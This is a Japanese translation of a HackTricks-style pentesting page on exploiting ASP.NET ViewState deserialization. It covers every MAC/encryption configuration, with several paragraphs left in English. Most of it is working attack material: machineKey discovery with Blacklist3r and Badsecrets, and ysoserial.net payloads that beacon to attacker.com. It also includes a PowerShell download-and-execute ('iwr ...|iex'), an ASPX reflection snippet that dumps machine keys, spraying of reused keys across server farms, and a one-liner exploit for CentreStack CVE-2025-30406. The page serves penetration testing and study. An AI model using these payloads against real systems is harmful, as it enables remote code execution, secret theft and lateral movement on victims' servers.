# 秘密を知らずに __VIEWSTATE を悪用する

{{#include ../../banners/hacktricks-training.md}}



## ViewState とは何か

**ViewState** は、ASP.NET においてページとコントロールのデータをページ間で保持するデフォルトの仕組みです。ページの HTML をレンダリングする際、ページの現在の状態とポストバック時に保持する値がシリアライズされて base64 エンコードされた文字列になります。これらの文字列は隠し ViewState フィールドに格納されます。

ViewState 情報は次の性質またはそれらの組み合わせで特徴づけられます:

- **Base64**:
- このフォーマットは `EnableViewStateMac` と `ViewStateEncryptionMode` の両方の属性が false に設定されているときに利用されます。
- **Base64 + MAC (Message Authentication Code) Enabled**:
- `EnableViewStateMac` 属性を true に設定することで MAC が有効化されます。これにより ViewState データの整合性が検証されます。
- **Base64 + Encrypted**:
- `ViewStateEncryptionMode` 属性が true に設定されている場合、ViewState データは暗号化され、機密性が確保されます。

## テストケース

図は .NET フレームワークのバージョンに基づく ASP.NET の ViewState の様々な構成を示した表です。内容の要約は次のとおりです:

1. .NET の任意のバージョンにおいて、MAC と Encryption が両方無効になっている場合、MachineKey は不要であり、したがって特定する適用可能な方法はありません。
2. 4.5 未満のバージョンでは、MAC が有効で Encryption が無効の場合、MachineKey が必要です。MachineKey を特定する方法は "Blacklist3r" と呼ばれます。
3. 4.5 未満のバージョンでは、MAC の有無にかかわらず Encryption が有効であれば MachineKey が必要です。MachineKey の特定は "Blacklist3r - Future Development" の仕事です。
4. 4.5 以上のバージョンでは、MAC と Encryption のすべての組み合わせ（両方 true、あるいは一方が true で他方が false）で MachineKey が必要になります。MachineKey は "Blacklist3r" を使って特定できます。

### Test Case: 1 – EnableViewStateMac=false and viewStateEncryptionMode=false

ViewStateMAC を完全に無効化するには、`AspNetEnforceViewStateMac` レジストリキーを次の場所で 0 に設定することも可能です：
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**ViewState 属性の特定**

このパラメータを含むリクエストをBurpSuiteでキャプチャして、ViewStateがMACで保護されているかどうかを確認できます。もしパラメータの保護にMACが使われていなければ、[**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)を使って悪用できます。
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### Test case 1.5 – Test case 1 と同様だが、サーバーが ViewState cookie を送信しない

開発者は **ViewState を HTTP Request の一部に含めない** ように設定できる（ユーザーはこの cookie を受け取らない）。\
誰もが、**ViewState** が **存在しない** 場合、その実装は ViewState deserialization に起因する潜在的な脆弱性から **安全** だと考えるかもしれない。\
しかし、そうではない。リクエストボディに **ViewState parameter を追加する** と、ysoserial で作成した serialized payload を送信することで、**Case 1** に示したように、依然として **code execution** を達成できる。

### Test Case: 2 – .Net < 4.5 および EnableViewStateMac=true & ViewStateEncryptionMode=false

特定の aspx ファイルで以下の変更を行うことで、**特定のページ** に対して **ViewState MAC** を有効にする必要がある:
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
以下のように、アプリケーション**全体**に対しては、**web.config** ファイルで設定することで行えます:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
このパラメータは今回MACで保護されているため、攻撃を成功させるにはまず使用されているキーが必要です。

使用されているキーを見つけるために[**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)を試してみてください。
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) は既知の machineKeys を特定できる別のツールです。Python で書かれているため、Blacklist3r と異なり Windows への依存はありません。.NET viewstates に対しては "python blacklist3r" ユーティリティがあり、これが最速で使う方法です。

It can either be supplied with the viewstate and generator directly:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
![https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png](https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png)

あるいは、ターゲットURLに直接接続して、HTMLからviewstateを切り出そうとします：
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
![https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png](https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png)

大規模に脆弱な viewstates を subdomain enumeration と組み合わせて検索するには、`badsecrets` [**BBOT**](exploiting-__viewstate-parameter.md) モジュールを使用できます:
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
![https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png](https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png)

幸運にもキーが見つかった場合、[**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**:** を使用して攻撃を続行できます。
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
_VIEWSTATEGENERATOR パラメータがサーバーから **送信されない** 場合、`--generator` パラメータを **指定する必要はありません** が、**以下のもの** は指定してください：
```bash
--apppath="/" --path="/hello.aspx"
```
### 再利用された `<machineKey>` 値を大規模に悪用する

Ink Dragon (2025) は、管理者が **Microsoft docs、StackOverflow の回答、またはベンダーのブログに掲載されたサンプルの `<machineKey>` ブロックをコピーする** とどれほど危険かを実証しました。1 つのターゲットが leaks またはそれらのキーをファーム内で再利用すると、ViewState を信頼する他のすべての ASP.NET ページが追加の脆弱性なしにリモートで乗っ取られる可能性があります。

1. **候補ワードリストを作る** — leaked `validationKey`/`decryptionKey` ペア（例: 公開リポジトリ、Microsoft blog posts、またはファーム内の一台から回収したキーをスクレイプ）を収集して Blacklist3r/Badsecrets に渡します:

```bash
AspDotNetWrapper.exe --keypath reused_machinekeys.txt --url https://target/_layouts/15/ToolPane.aspx --decrypt --purpose=viewstate --modifier=<VIEWSTATEGENERATOR>
# or let Badsecrets spray the list
bbot -f subdomain-enum -m badsecrets --badsecrets-keylist reused_machinekeys.txt -t sharepoint.customer.tld
```

ツールは各候補キーで無害な `__VIEWSTATE` ブロブに繰り返し署名し、サーバが MAC を受け入れるまで試行します。受理されたらそのキーが有効であることが証明されます。
2. **キーが分かったら悪意ある ViewState を偽造する**。暗号化が無効な場合は `validationKey` のみで十分です。暗号化が有効な場合は、復号 → デシリアライズの経路を通過させるために対応する `decryptionKey` も含めます:

```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -c iwr http://x.x.x.x/a.ps1|iex" \
--validationkey "$VALIDATION" --decryptionkey "$DECRYPTION" --validationalg="SHA1" --generator=<VIEWSTATEGENERATOR>
```

オペレータはしばしばディスク上に常駐するランチャ（例: PrintNotifyPotato、ShadowPad ローダなど）をペイロード内に埋め込んでおり、これは IIS ワーカー（`w3wp.exe`）として実行されます。
3. **横展開 (lateral pivot)** — 同じ `<machineKey>` を兄弟の SharePoint/IIS ノード間で再利用してピボットします。1 台が侵害されれば、構成を回転（ローテーション）していない他のすべてのサーバに対して同じキーを再利用して攻撃できます。

### Test Case: 3 – .Net < 4.5 and EnableViewStateMac=true/false and ViewStateEncryptionMode=true

このケースではパラメータが MAC で保護されているか不明です。したがって、その値はおそらく暗号化されており、脆弱性を悪用するにはペイロードを暗号化するための Machine Key が必要になります。

**In this case the** [**Blacklist3r**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) **module is under development...**

**Prior to .NET 4.5**, ASP.NET はユーザからの **unencrypted** \_`__VIEWSTATE`\_parameter を受け入れることがあり、たとえ **`ViewStateEncryptionMode`** が _**Always**_ に設定されていてもです。ASP.NET はリクエスト内の **`__VIEWSTATEENCRYPTED`** パラメータの **存在** のみを **チェック** します。**このパラメータを削除して暗号化されていないペイロードを送信すると、依然として処理されます。**

したがって、攻撃者がファイルトラバーサルなど別の vuln を介して Machinekey を取得できれば、Case 2 で使った [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) コマンドを用いて ViewState のデシリアライズ脆弱性を通じた RCE を実行できます。

- リクエストから `__VIEWSTATEENCRYPTED` パラメータを除去して ViewState のデシリアライズ脆弱性を突いてください。さもないと Viewstate MAC 検証エラーが返り、エクスプロイトは失敗します。

### Test Case: 4 – .Net >= 4.5 and EnableViewStateMac=true/false and ViewStateEncryptionMode=true/false except both attribute to false

web.config ファイル内に以下のパラメータを指定することで、ASP.NET フレームワークの使用を強制できます。
```xml
<httpRuntime targetFramework="4.5" />
```
代わりに、これは web.config ファイルの `machineKey` パラメータ内に以下のオプションを指定することで行えます。
```bash
compatibilityMode="Framework45"
```
前述のとおり、**value is encrypted.**。そのため、**valid payload the attacker need the key** を送信するには key が必要です。

You can try to use [**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)を使って、使用されている key を見つけることができます:
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
IISDirPath と TargetPagePath の詳細な説明については、[refer here](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

または、[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets)（generator value を指定して）:
```bash
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
![https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png](https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png)

有効な Machine key が特定されたら、**次のステップはシリアライズされたペイロードを生成するために** [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
`__VIEWSTATEGENERATOR` の値が分かっている場合、`--generator` パラメータにその値を指定して**使用**し、`--path` と `--apppath` パラメータを**省略**してみてください。

![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2019/06/4.2.png)

A successful exploitation of the ViewState deserialization vulnerability will lead to an out-of-band request to an attacker-controlled server, which includes the username. This kind of exploit is demonstrated in a proof of concept (PoC) which can be found through a resource titled "Exploiting ViewState Deserialization using Blacklist3r and YsoSerial.NET". For further details on how the exploitation process works and how to utilize tools like Blacklist3r for identifying the MachineKey, you can review the provided [PoC of Successful Exploitation](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC).

### Test Case 6 – ViewStateUserKeys is being used

The **ViewStateUserKey** property can be used to **defend** against a **CSRF attack**. If such a key has been defined in the application and we try to generate the **ViewState** payload with the methods discussed till now, the **payload won’t be processed by the application**.\
正しくペイロードを作成するには、さらに1つのパラメータを使用する必要があります:
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
### 成功したエクスプロイトの結果 <a href="#poc" id="poc"></a>

すべてのテストケースにおいて、ViewState YSoSerial.Net ペイロードが **successfully** に動作した場合、サーバは「**500 Internal server error**」で応答し、レスポンス内容に「**The state information is invalid for this page and might be corrupted**」が含まれ、OOB reques. を取得します。

Check for [further information here](<https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/deserialization/[**https:/www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https:/www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)/README.md>)

### Reflectionを使ったASP.NET Machine Keysのダンプ (SharPyShell/SharePoint ToolShell)

ターゲットの web root 内に **upload or execute arbitrary ASPX code** が可能な攻撃者は、総当りする代わりに `__VIEWSTATE` を保護する秘密鍵を直接取得できます。  
keysをleaksする最小限のペイロードは、reflectionを介して内部の .NET クラスを利用します：
```csharp
<%@ Import Namespace="System.Web.Configuration" %>
<%@ Import Namespace="System.Reflection" %>
<script runat="server">
public void Page_Load(object sender, EventArgs e)
{
var asm = Assembly.Load("System.Web");
var sect = asm.GetType("System.Web.Configuration.MachineKeySection");
var m = sect.GetMethod("GetApplicationConfig", BindingFlags.Static | BindingFlags.NonPublic);
var cfg = (MachineKeySection)m.Invoke(null, null);
// Output: ValidationKey|DecryptionKey|Algorithm|CompatibilityMode
Response.Write($"{cfg.ValidationKey}|{cfg.DecryptionKey}|{cfg.Decryption}|{cfg.CompatibilityMode}");
}
</script>
```
ページを要求すると、**ValidationKey**、**DecryptionKey**、暗号化アルゴリズム、および ASP.NET の互換モードが出力されます。これらの値はそのまま **ysoserial.net** に渡して、有効な署名済みの `__VIEWSTATE` ガジェットを作成できます:
```bash
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
-c "powershell -nop -c \"whoami\"" \
--generator=<VIEWSTATE_GENERATOR> \
--validationkey=<VALIDATION_KEY> --validationalg=<VALIDATION_ALG> \
--decryptionkey=<DECRYPTION_KEY> --decryptionalg=<DECRYPTION_ALG> \
--islegacy --minify
curl "http://victim/page.aspx?__VIEWSTATE=<PAYLOAD>"
```
This **key-exfiltration primitive** は2025年にオンプレミスの SharePoint サーバー（"ToolShell" – CVE-2025-53770/53771）に対して大規模に悪用されましたが、攻撃者がサーバー側でコードを実行できる任意の ASP.NET アプリケーションにも適用できます。

## 2024-2025 実世界の悪用シナリオとハードコーディングされた machineKey

### Microsoft “publicly disclosed machineKey” の波（Dec 2024 – Feb 2025）
Microsoft Threat Intelligence は、*machineKey* が以前に public sources (GitHub gists, blog posts, paste sites) で leaked していた ASP.NET サイトに対する大規模な悪用を報告しました。攻撃者はこれらのキーを列挙し、WAF 長さ制限を回避するために新しい `ysoserial.net` 1.41 の `--minify` および `--islegacy` フラグを使用して有効な `__VIEWSTATE` ガジェットを生成しました:
```bash
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "whoami" \
--validationkey=<LEAKED_VALIDATION_KEY> --validationalg=SHA1 \
--decryptionkey=<LEAKED_DECRYPTION_KEY> --decryptionalg=AES \
--generator=<VIEWSTATEGEN> --minify
```
Targets that keep reusing the same static keys across farms stay vulnerable indefinitely; once they migrate to `AutoGenerate` values the spray technique dies, so prioritize legacy deployments that still expose hard-coded material.

### CVE-2025-30406 – Gladinet CentreStack / Triofox のハードコードされたキー
Kudelski Security は、複数の CentreStack / Triofox リリースが同一の `machineKey` 値で出荷されていることを発見し、これにより ViewState 偽造を通じて認証不要のリモートコード実行が可能になると報告しました (CVE-2025-30406)。

ワンライナー exploit:
```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "calc.exe" \
--validationkey=ACC97055B2A494507D7D7C92DC1C854E8EA7BF4C \
--validationalg=SHA1 \
--decryptionkey=1FB1DEBB8B3B492390B2ABC63E6D1B53DC9CA2D7 \
--decryptionalg=AES --generator=24D41AAB --minify \
| curl -d "__VIEWSTATE=$(cat -)" http://victim/portal/loginpage.aspx
```
CentreStack 16.4.10315.56368 / Triofox 16.4.10317.56372 で修正済み – 直ちにアップグレードするかキーを置き換えてください。

## References

- [Exploiting ViewState deserialization using Blacklist3r and YSoSerial.NET](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
- [Deep dive into .NET ViewState deserialization and its exploitation](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)
- [Exploiting deserialisation in ASP.NET via ViewState (Soroush Dalili, 2019)](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
- [Introducing badsecrets – fast machineKey discovery](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)
- [SharePoint “ToolShell” exploitation chain (Eye Security, 2025)](https://research.eye.security/sharepoint-under-siege/)
- [Microsoft Security – Code injection attacks abusing publicly disclosed ASP.NET machine keys (Feb 6 2025)](https://www.microsoft.com/en-us/security/blog/2025/02/06/code-injection-attacks-using-publicly-disclosed-asp-net-machine-keys/)
- [Kudelski Security advisory – Gladinet CentreStack / Triofox RCE CVE-2025-30406 (Apr 16 2025)](https://research.kudelskisecurity.com/2025/04/16/gladinet-centrestack-and-gladinet-triofox-critical-rce-cve-2025-30406/)
- [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
- [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)
- [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
- [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)
- [SharePoint “ToolShell” exploitation chain (Eye Security, 2025)](https://research.eye.security/sharepoint-under-siege/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)



{{#include ../../banners/hacktricks-training.md}}
